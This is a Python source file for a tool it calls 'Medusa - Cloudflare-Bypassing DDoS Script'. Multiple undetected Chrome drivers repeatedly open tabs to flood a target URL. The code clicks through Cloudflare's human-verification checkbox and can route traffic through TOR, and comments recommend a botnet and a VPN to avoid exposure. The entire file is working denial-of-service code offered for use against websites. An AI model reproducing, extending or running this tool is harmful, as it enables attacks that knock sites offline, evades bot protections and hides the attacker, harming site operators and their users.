import os
import argparse

import threading
from time import sleep
from termcolor import colored
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.common import TimeoutException
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

"""
MAKE SURE YOU HAVE A BOTNET AVAILABLE, OTHERWISE, THIS WON'T DO MUCH DAMAGE TO YOUR TARGET

IF YOU DON'T, READ THE FOLLOWING:
Make sure you have a VPN or a proxy running, if you aren't, be aware that your IP will be exposed to the target.
( If you don't have TOR Proxies enabled )
"""

# This is the target of your DDoS Attack
# e.g. TARGET = "https://www.google.com"
TARGET = "https://www.google.com"

# Use TOR Proxies or not
# DEFAULT: False
TOR_PROXIES = False

# Headless mode (show browser or not?)
# DEFAULT: False
HEADLESS = False

# How many threads (browsers/drivers) to open
# MAX: 7, DEFAULT: 3
N_THREADS = 3

# Amount of tabs to open per driver (browser)
# MAX: 10, DEFAULT: 3
N_TABS = 10

# Amount of seconds to wait before opening new tabs
# DEFAULT: 5
NEW_TABS_TIMEOUT = 5

# Amount of seconds allowing Medusa to bypass Cloudflare (if detected)
# DEFAULT: 5
CLOUDFLARE_BYPASS_TIMEOUT = 5

# Don't change from here
DRIVERS = []

def start():
    '''
    Print ASCII art banner
    '''
    print(colored(r"""
 ___  ___         _
 |  \/  |        | |                
 | \  / | ___  __| |_   _ ___  __ _ 
 | |\/| |/ _ \/ _` | | | / __|/ _` |
 | |  | |  __/ (_| | |_| \__ \ (_| |
 |_|  |_|\___|\__,_|\__,_|___/\__,_|
    """, "green"))
    print(colored("Medusa - Cloudflare-Bypassing DDoS Script", "green"))
    print(colored("=> TELEGRAM: @MedusaHacks\n\n", "green"))

def parse_arguments():
    parser = argparse.ArgumentParser(description='Cloudflare-Bypassing DDoS Script')
    parser.add_argument('--target', default=TARGET, help='Target URL')
    parser.add_argument('--tor', action='store_true', help='Use TOR Proxies')
    parser.add_argument('--headless', action='store_true', help='Headless mode')
    parser.add_argument('--threads', type=int, default=N_THREADS, help='Number of threads')
    parser.add_argument('--tabs', type=int, default=N_TABS, help='Number of tabs per driver')
    parser.add_argument('--tabs-timeout', type=int, default=NEW_TABS_TIMEOUT, help='Timeout before opening new tabs')
    parser.add_argument('--cloudflare-timeout', type=int, default=CLOUDFLARE_BYPASS_TIMEOUT, help='Cloudflare bypass timeout')
    return parser.parse_args()


def wait_elem(
    driver,
    selector,
    m=EC.presence_of_element_located,
    method=By.XPATH,
    tmt=5,
    click=False,
) -> uc.WebElement | None:
    try:
        el = WebDriverWait(driver, tmt).until(m((method, selector)))
        if click and el:
            el.click()
        return el
    except TimeoutException:
        return None
    except Exception as f:
        print(f)
        return None


def cloudflare(driver):
    '''
    Bypasses Cloudflare, if it is detected
    '''
    for _ in range(5):
        if not any(
            [
                i in driver.page_source
                for i in ["site connection is secure", "are a human"]
            ]
        ):
            return False
        iframe = wait_elem(
            driver, 'iframe[src *= "cloudflare.com"]', tmt=15, method=By.CSS_SELECTOR
        )
        if not iframe:
            return False
        driver.switch_to.frame(iframe)
        cb = wait_elem(driver, "input[type=checkbox]", method=By.CSS_SELECTOR)
        if cb:
            cb.click()
        driver.switch_to.default_content()
        sleep(CLOUDFLARE_BYPASS_TIMEOUT)
        return True


def exec(driver):
    '''
    This function will open N_TABS tabs per driver (browser)
    '''
    while True:
        for i in range(N_TABS):
            driver.execute_script("window.open('', '_blank');")
            print(colored(f"  => [+] New Request: {i}", "blue"))
            driver.switch_to.window(driver.window_handles[1])
            driver.get(TARGET)
            if cloudflare(driver):
                print("[+] Cloudflare detected, bypassing...")
        # Wait 5 seconds
        sleep(NEW_TABS_TIMEOUT)


def quit():
    '''
    This function will quit all drivers
    '''
    # Check system
    if os.name == "nt":
        os.system("taskkill /F /IM chrome.exe")
    else:
        os.system("pkill chrome")


if __name__ == "__main__":
    '''
    Execute the script
    '''
    args = parse_arguments()
    TARGET = args.target if args.target else TARGET
    TOR_PROXIES = args.tor if args.tor else TOR_PROXIES
    HEADLESS = args.headless if args.headless else HEADLESS
    N_THREADS = args.threads if args.threads else N_THREADS
    N_TABS = args.tabs if args.tabs else N_TABS
    NEW_TABS_TIMEOUT = args.tabs_timeout if args.tabs_timeout else NEW_TABS_TIMEOUT
    CLOUDFLARE_BYPASS_TIMEOUT = args.cloudflare_timeout if args.cloudflare_timeout else CLOUDFLARE_BYPASS_TIMEOUT

    # Print banner
    start()

    # Quit all running drivers from previous runs
    quit()

    # Check N_THREADS
    if N_THREADS > 7:
        print(colored("[-] N_THREADS must be less than 7", "red"))
        exit(1)

    # Check N_TABS
    if N_TABS > 10:
        print(colored("[-] N_TABS must be less than 10", "red"))
        exit(1)

    print(colored(f"[*] Initializing {N_THREADS} threads...", "yellow"))

    # Open N_THREADS drivers
    for i in range(N_THREADS):
        options = Options()
        options.add_argument("--disable-extensions")
        if TOR_PROXIES:
            options.add_argument(f"--proxy-server=socks5://127.0.0.1:9050")
        if HEADLESS:
            options.add_argument("--headless=true")
        driver = uc.Chrome(options=options, browser_executable_path="chrome.exe",  use_subprocess=True)
        driver.execute_script(f'window.open("", "_blank");')
        print(colored(f"[+] Created driver: Nr. {i}", "green"))
        DRIVERS.append(driver)

    print(colored("\n-.-.-.- Press [ENTER] to start  attack -.-.-.-", "green"))
    input()

    for driver in DRIVERS:
        threading.Thread(
            target=exec,
            args=(driver,),
        ).start()

    # To close processes immediately, run: taskkill /F /IM chrome.exe
